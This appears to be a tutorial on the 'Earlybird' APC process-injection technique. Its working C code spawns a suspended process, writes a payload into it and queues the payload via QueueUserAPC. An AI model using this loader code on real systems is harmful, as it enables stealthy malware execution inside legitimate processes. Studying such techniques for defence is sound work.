# Earlybird Injection
Earlybird injection is an improvement over the **APC Injection** Technique. The most important drawback of the **APC Injection** technique was that the program entered into a _Wait-and-Pray_ state, where we could only hope that our payload would get executed. That is not very reliable as there is a fair chance that the payload might not even be executed. 

This is where **Earlybird Injection** comes in handy by making sure that our payload is triggered every time. To understand how the technique works, let's jump directly into the code. 

## The Code
Lets begin with the `main()` function:

```c
    printf("[i] Spawing and injecting into:\t%s\n", TARGET);
    int result = inject_earlybird();
    printf("[i] Injection Complete!\n");
    return 0;
```

The first difference we notice is that we do not have a `find_pid()` function like other examples. This is because we _launch_ the target process instead of injecting into an already running process. So, let's look into the `inject_earlybird()` function:

```c
int inject_earlybird() {
    int pid = 0;
    DWORD bWritten = 0;
    HANDLE hProc = NULL;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    void * pRemoteCode;
    ZeroMemory( &si, sizeof(si) );
    ZeroMemory( &pi, sizeof(pi) );
    si.cb = sizeof(si);
    CreateProcessA(0, TARGET, 0, 0, 0, CREATE_SUSPENDED, 0, 0, &si, &pi);
    printf("[i] Started Process with PID: %d and ThreadId: %d\n", pi.dwProcessId, pi.dwThreadId);
    pRemoteCode = VirtualAllocEx(pi.hProcess, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
    WriteProcessMemory(pi.hProcess, pRemoteCode, (PVOID) payload, (SIZE_T) payload_len, (SIZE_T *)&bWritten);
    DWORD dResult = QueueUserAPC((PAPCFUNC)pRemoteCode, pi.hThread, NULL);
    ResumeThread(pi.hThread);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return 0;
}
```